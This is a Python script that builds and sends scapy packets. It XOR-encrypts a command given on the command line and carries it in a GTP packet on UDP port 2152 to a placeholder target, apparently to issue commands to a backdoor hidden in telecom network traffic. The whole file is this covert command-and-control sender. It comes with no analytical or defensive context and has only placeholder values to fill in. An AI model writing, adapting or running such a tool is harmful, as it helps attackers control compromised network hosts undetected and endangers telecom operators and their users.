from scapy.all import *
from scapy.layers.inet import IP, UDP
from scapy.contrib.gtp import GTPHeader, GTP_U_Header
import sys

def encrypt(key, plaintext):
    key_idx = 0
    ciphertext = bytearray()
    for byte in plaintext:
        ciphertext.append(byte ^ key[key_idx])
        key_idx = (key_idx + 1) % len(key)
    return bytes(ciphertext)

def create_gtp_packet(command):
    key = b'your_key_here'
    message_type = b'\x03'
    encrypted_command = encrypt(key, command.encode())
    payload = message_type + encrypted_command
    packet = (IP(dst="target_ip") /
              UDP(sport=2152, dport=2152) /
              GTPHeader(message_type=1) /
              Raw(load=payload))
    return packet

def send_gtp_packet(packet):
    send(packet, verbose=False)
    print("Packet sent.")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: script.py <command>")
        sys.exit(1)

    command = sys.argv[1]
    packet = create_gtp_packet(command)
    send_gtp_packet(packet)
